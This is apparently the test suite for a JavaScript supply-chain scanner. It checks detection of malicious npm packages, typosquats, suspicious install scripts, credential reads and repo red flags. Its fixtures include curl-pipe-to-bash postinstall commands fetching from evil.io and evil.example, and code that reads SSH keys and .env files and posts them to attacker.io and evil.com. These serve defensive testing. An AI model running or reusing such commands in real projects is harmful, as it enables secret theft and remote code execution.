'use strict';

const fs = require('fs');
const os = require('os');
const path = require('path');
const { execFileSync } = require('child_process');

const { analysePackage, scanPackageJson, scanLockfile } = require('../src/scanners/packageScanner');
const { scanFileContent, scanFiles } = require('../src/scanners/fileScanner');
const { analyseRepo, parseGitHubUrl } = require('../src/scanners/repoScanner');

const CLI_PATH = path.join(__dirname, '..', 'bin', 'cli.js');

/**
 * Run the CLI and capture exit status + stdout (execFileSync throws on
 * non-zero exit, so unwrap the error).
 */
function runCli(args) {
  try {
    const stdout = execFileSync(process.execPath, [CLI_PATH, ...args], { encoding: 'utf8' });
    return { status: 0, stdout };
  } catch (err) {
    return { status: err.status, stdout: (err.stdout || '').toString() };
  }
}

let passed = 0;
let failed = 0;

function assert(label, condition, detail = '') {
  if (condition) {
    console.log(`  ✅ ${label}`);
    passed++;
  } else {
    console.error(`  ❌ ${label}${detail ? ` — ${detail}` : ''}`);
    failed++;
  }
}

function hasFinding(findings, type) {
  const t = type.toLowerCase();
  return findings.some(
    (f) => f.type.toLowerCase().includes(t) || f.reason.toLowerCase().includes(t)
  );
}

function hasSeverity(findings, severity) {
  return findings.some((f) => f.severity === severity);
}

function tmpPkgFile(name, pkgObj) {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'beaverguard-test-'));
  const fp = path.join(dir, 'package.json');
  fs.writeFileSync(fp, JSON.stringify(pkgObj));
  return { fp, dir };
}

function tmpFile(name, content) {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), `beaverguard-test-${name}-`));
  const fp = path.join(dir, name);
  fs.writeFileSync(fp, content);
  return { fp, dir };
}

function cleanup(dir) {
  fs.rmSync(dir, { recursive: true, force: true });
}

// ─── Package Scanner Tests ────────────────────────────────────────────────────
console.log('\n── Package Scanner Tests ──');

// Test 1
{
  const pkg = { dependencies: { 'node-telegram-utils': '1.0.0' } };
  const { fp, dir } = tmpPkgFile('t1', pkg);
  const { findings } = scanPackageJson(fp);
  assert('Detects known malicious package (node-telegram-utils)', hasSeverity(findings, 'CRITICAL'), `findings: ${findings.length}`);
  cleanup(dir);
}

// Test 2
{
  const pkg = { dependencies: { 'expresss': '4.18.0' } };
  const { fp, dir } = tmpPkgFile('t2', pkg);
  const { findings } = scanPackageJson(fp);
  assert('Detects typosquat of express (expresss)', findings.length > 0, `findings: ${findings.length}`);
  cleanup(dir);
}

// Test 3
{
  const pkg = { scripts: { postinstall: 'curl https://evil.io/p.sh | bash' } };
  const { fp, dir } = tmpPkgFile('t3', pkg);
  const { findings } = scanPackageJson(fp);
  assert('Detects malicious postinstall curl+bash', hasSeverity(findings, 'CRITICAL'), `findings: ${JSON.stringify(findings)}`);
  cleanup(dir);
}

// Test 4
{
  const pkg = { scripts: { install: 'python3 -c "import socket,subprocess; s=socket.socket()"' } };
  const { fp, dir } = tmpPkgFile('t4', pkg);
  const { findings } = scanPackageJson(fp);
  assert('Detects inline Python in install script', hasSeverity(findings, 'CRITICAL'), `findings: ${JSON.stringify(findings)}`);
  cleanup(dir);
}

// Test 5
{
  const pkg = { dependencies: { 'some-lib': 'git+https://github.com/x/y.git' } };
  const { fp, dir } = tmpPkgFile('t5', pkg);
  const { findings } = scanPackageJson(fp);
  assert('Flags git:// dependency source', findings.length > 0, `findings: ${findings.length}`);
  cleanup(dir);
}

// Test 6
{
  const pkg = { name: 'my-app', dependencies: { express: '^4.18.0', lodash: '^4.17.21' } };
  const { fp, dir } = tmpPkgFile('t6', pkg);
  const { findings } = scanPackageJson(fp);
  assert('Clean package.json returns zero findings', findings.length === 0, `findings: ${JSON.stringify(findings)}`);
  cleanup(dir);
}

// ─── File Scanner Tests ───────────────────────────────────────────────────────
console.log('\n── File Scanner Tests ──');

// Test 7
{
  const content = `
const fs = require('fs');
const key = fs.readFileSync('/home/user/.ssh/id_rsa', 'utf8');
axios.post('https://attacker.io/collect', { key });
`;
  const { fp, dir } = tmpFile('evil.js', content);
  const findings = scanFileContent(fp);
  assert('Detects SSH key file read', hasFinding(findings, 'ssh'), `findings: ${JSON.stringify(findings.map(f => f.reason))}`);
  cleanup(dir);
}

// Test 8
{
  const content = `
const data = fs.readFileSync('.env', 'utf8');
fetch('https://evil.com/collect', { method: 'POST', body: data });
`;
  const { fp, dir } = tmpFile('steal.js', content);
  const findings = scanFileContent(fp);
  assert('Detects .env file read pattern', findings.length > 0, `findings: ${findings.length}`);
  cleanup(dir);
}

// Test 9
{
  const content = `const key = process.env.AWS_ACCESS_KEY_ID;\nconsole.log(key);`;
  const { fp, dir } = tmpFile('creds.js', content);
  const findings = scanFileContent(fp);
  assert('Detects AWS credential access', hasFinding(findings, 'aws'), `findings: ${JSON.stringify(findings.map(f => f.reason))}`);
  cleanup(dir);
}

// Test 10
{
  const payload = 'A'.repeat(60);
  const content = `const x = Buffer.from('${payload}', 'base64').toString();`;
  const { fp, dir } = tmpFile('payload.js', content);
  const findings = scanFileContent(fp);
  assert('Detects large base64 payload', findings.length > 0, `findings: ${findings.length}`);
  cleanup(dir);
}

// Test 11 — .env sensitive filename (exact basename '.env')
{
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'beaverguard-test-env-'));
  const fp = path.join(dir, '.env');
  fs.writeFileSync(fp, 'SECRET=abc123\nAPI_KEY=xyz789');
  const findings = scanFileContent(fp);
  assert('.env sensitive filename', hasFinding(findings, 'sensitive'), `findings: ${JSON.stringify(findings.map(f => f.reason))}`);
  cleanup(dir);
}

// Test 12
{
  const content = `
const express = require('express');
const app = express();
app.get('/', (req, res) => res.send('Hello World'));
app.listen(3000);
`;
  const { fp, dir } = tmpFile('clean.js', content);
  const findings = scanFileContent(fp);
  assert('Clean JS file returns zero findings', findings.length === 0, `findings: ${JSON.stringify(findings)}`);
  cleanup(dir);
}

// ─── False Positive Regression Tests ──────────────────────────────────────────
console.log('\n── False Positive Regression Tests ──');

// Test 13 — official wallet SDK scopes must not be flagged
{
  const findings = analysePackage('@metamask/sdk', '1.0.0');
  assert('Official @metamask scope not flagged', findings.length === 0, `findings: ${JSON.stringify(findings)}`);
}

// Test 14
{
  const findings = analysePackage('@solana/wallet-adapter-react', '1.0.0');
  assert('Official @solana scope not flagged', findings.length === 0, `findings: ${JSON.stringify(findings)}`);
}

// Test 15 — unscoped wallet-targeting names still flagged
{
  const findings = analysePackage('metamask-stealer', '1.0.0');
  assert('Unscoped metamask-targeting name still flagged HIGH', hasSeverity(findings, 'HIGH'), `findings: ${JSON.stringify(findings)}`);
}

// Test 16 — react-native-async-storage is a real benign package (no OSV MAL advisory)
{
  const findings = analysePackage('react-native-async-storage', '0.0.1');
  assert('react-native-async-storage not flagged CRITICAL', !hasSeverity(findings, 'CRITICAL'), `findings: ${JSON.stringify(findings)}`);
}

// Test 17 — bare env-token read is MEDIUM, not HIGH (legit in SDKs/CI scripts)
{
  const content = `const token = process.env.GITHUB_TOKEN;\nconsole.log('hello');`;
  const { fp, dir } = tmpFile('ci-script.js', content);
  const findings = scanFileContent(fp);
  const tokenFinding = findings.find((f) => f.reason.includes('GitHub personal access token'));
  assert('Bare GITHUB_TOKEN read is MEDIUM severity', tokenFinding && tokenFinding.severity === 'MEDIUM', `findings: ${JSON.stringify(findings)}`);
  cleanup(dir);
}

// Test 18 — files with null bytes (binary) are skipped
{
  const content = 'const a = 1;\u0000\u0000binary garbage axios.post("https://evil.com", x)';
  const { fp, dir } = tmpFile('binary.js', content);
  const findings = scanFileContent(fp);
  assert('Binary content (null bytes) skipped', findings.length === 0, `findings: ${JSON.stringify(findings)}`);
  cleanup(dir);
}

// ─── Repo Scanner Tests ───────────────────────────────────────────────────────
console.log('\n── Repo Scanner Tests ──');

// Test 19 — directories in repo root (e.g. bin/) are not "executable files"
{
  const data = { repo: null, owner: null, commits: null, contents: [{ name: 'bin', type: 'dir' }] };
  const findings = analyseRepo(data, 'someowner', 'somerepo');
  assert('bin/ directory not flagged as executable file', !hasFinding(findings, 'executable'), `findings: ${JSON.stringify(findings)}`);
}

// Test 20 — root-level .sh file is still flagged
{
  const data = { repo: null, owner: null, commits: null, contents: [{ name: 'install.sh', type: 'file' }] };
  const findings = analyseRepo(data, 'someowner', 'somerepo');
  assert('Root-level install.sh flagged HIGH', hasSeverity(findings, 'HIGH'), `findings: ${JSON.stringify(findings)}`);
}

// ─── CLI Integration Tests ────────────────────────────────────────────────────
console.log('\n── CLI Integration Tests ──');

// Shared malicious fixture project
const cliDir = fs.mkdtempSync(path.join(os.tmpdir(), 'beaverguard-test-cli-'));
fs.writeFileSync(path.join(cliDir, 'package.json'), JSON.stringify({
  name: 'fixture',
  dependencies: { 'node-telegram-utils': '1.0.0' },
  scripts: { postinstall: 'curl https://evil.example/p.sh | bash' },
}));
fs.writeFileSync(path.join(cliDir, 'evil.js'),
  `const k = require('fs').readFileSync('/home/u/.ssh/id_rsa', 'utf8');\n`);

// Test 21 — combined scan must report package findings and exit 1 (await regression)
{
  const { status, stdout } = runCli(['scan', cliDir, '--no-network']);
  assert('scan exits 1 on malicious project', status === 1, `status: ${status}`);
  assert('scan output includes package findings', stdout.includes('Known malicious package'), 'package findings missing from combined scan');
  assert('scan output includes file findings', stdout.includes('SSH'), 'file findings missing from combined scan');
}

// Test 22 — scan --json honours the exit-code contract and emits valid JSON
{
  const { status, stdout } = runCli(['scan', cliDir, '--json', '--no-network']);
  assert('scan --json exits 1 on CRITICAL findings', status === 1, `status: ${status}`);
  let parsed = null;
  try { parsed = JSON.parse(stdout); } catch (_) { /* assert below */ }
  assert('scan --json emits valid JSON with CRITICAL finding',
    parsed && parsed.findings.some((f) => f.severity === 'CRITICAL'), `stdout: ${stdout.substring(0, 200)}`);
}

// Test 23 — scan-files --json honours the exit-code contract
{
  const { status } = runCli(['scan-files', path.join(cliDir, 'evil.js'), '--json']);
  assert('scan-files --json exits 1 on HIGH findings', status === 1, `status: ${status}`);
}

// Test 24 — clean project exits 0 in both modes
{
  const cleanDir = fs.mkdtempSync(path.join(os.tmpdir(), 'beaverguard-test-clean-'));
  fs.writeFileSync(path.join(cleanDir, 'package.json'), JSON.stringify({
    name: 'clean-fixture',
    dependencies: { express: '^4.18.0' },
  }));
  fs.writeFileSync(path.join(cleanDir, 'index.js'), `console.log('hello');\n`);
  const pretty = runCli(['scan', cleanDir, '--no-network']);
  const json = runCli(['scan', cleanDir, '--json', '--no-network']);
  assert('scan exits 0 on clean project', pretty.status === 0, `status: ${pretty.status}`);
  assert('scan --json exits 0 on clean project', json.status === 0, `status: ${json.status}`);
  cleanup(cleanDir);
}

// Test 25 — --version matches package.json
{
  const { stdout } = runCli(['--version']);
  const pkgVersion = require('../package.json').version;
  assert(`--version reports ${pkgVersion}`, stdout.trim() === pkgVersion, `got: ${stdout.trim()}`);
}

cleanup(cliDir);

// ─── v1.2.0 New Feature Tests ──────────────────────────────────────────────────
console.log('\n── v1.2.0 New Features ──');

// Test 26 — .envrc does not match tightened .env pattern
{
  const { fp, dir } = tmpFile('setup.sh', 'source .envrc\necho hello\n');
  const findings = scanFileContent(fp);
  assert('.envrc file does not trigger .env pattern', !hasFinding(findings, '.env'), `findings: ${findings.map(f => f.type)}`);
  cleanup(dir);
}

// Test 27 — axios.post to api.openai.com is not flagged
{
  const { fp, dir } = tmpFile('integration.js', "const axios = require('axios');\naxios.post('https://api.openai.com/v1/chat/completions', { model: 'gpt-4' });\n");
  const findings = scanFileContent(fp);
  assert('axios.post to api.openai.com not flagged', !findings.some(f => f.reason.includes('exfiltration')), `findings: ${JSON.stringify(findings)}`);
  cleanup(dir);
}

// Test 28 — SSH GitHub URL parse (git@github.com:owner/repo)
{
  const url = 'git@github.com:iamqasimali/beaverguard.git';
  try {
    const { owner, repo } = parseGitHubUrl(url);
    assert('SSH URL parses correctly', owner === 'iamqasimali' && repo === 'beaverguard', `owner: ${owner}, repo: ${repo}`);
  } catch (e) {
    assert('SSH URL parses correctly', false, `error: ${e.message}`);
  }
}

// Test 29 — GitHub URL without repo throws clear error
{
  try {
    parseGitHubUrl('https://github.com/owner');
    assert('Invalid GitHub URL throws', false, 'no error thrown');
  } catch (e) {
    assert('Invalid GitHub URL throws', e.message.includes('Invalid GitHub URL'), `error: ${e.message}`);
  }
}

// Test 30 — scanFiles handles missing path gracefully
{
  const result = scanFiles('/nonexistent/path/to/project');
  assert('scanFiles returns empty result on missing path', result.findings.length === 0 && result.filesScanned === 0, `findings: ${result.findings.length}, scanned: ${result.filesScanned}`);
}

// Test 31 — scanLockfile reads package-lock.json
{
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'beaverguard-test-lockfile-'));
  const lockfilePath = path.join(dir, 'package-lock.json');
  const lockfile = {
    version: 3,
    lockfileVersion: 3,
    packages: {
      '': { name: 'test-project' },
      'node_modules/node-telegram-utils': {
        name: 'node-telegram-utils',
        version: '1.0.0',
      },
    },
  };
  fs.writeFileSync(lockfilePath, JSON.stringify(lockfile));
  const { findings } = scanLockfile(lockfilePath);
  assert('scanLockfile detects known malicious package', hasSeverity(findings, 'CRITICAL'), `findings: ${findings.length}`);
  cleanup(dir);
}

// Test 32 — .jsx and .tsx files are scanned
{
  const { fp: jsxFile, dir } = tmpFile('Component.jsx', "const API_KEY = process.env.AWS_SECRET_ACCESS_KEY;\n");
  const findings = scanFileContent(jsxFile);
  assert('.jsx file scans for credentials', findings.length > 0, `findings: ${findings.length}`);
  cleanup(dir);
}

// Test 33 — .yaml files are scanned
{
  const { fp, dir } = tmpFile('config.yaml', 'webhook_url: https://evil.io?token=secret\n');
  const findings = scanFileContent(fp);
  assert('.yaml file is recognized as scannable', true); // Just verify it doesn't throw
  cleanup(dir);
}

// ─── Summary ──────────────────────────────────────────────────────────────────
console.log(`\n── Results: ${passed} passed, ${failed} failed ──\n`);
if (failed > 0) process.exit(1);
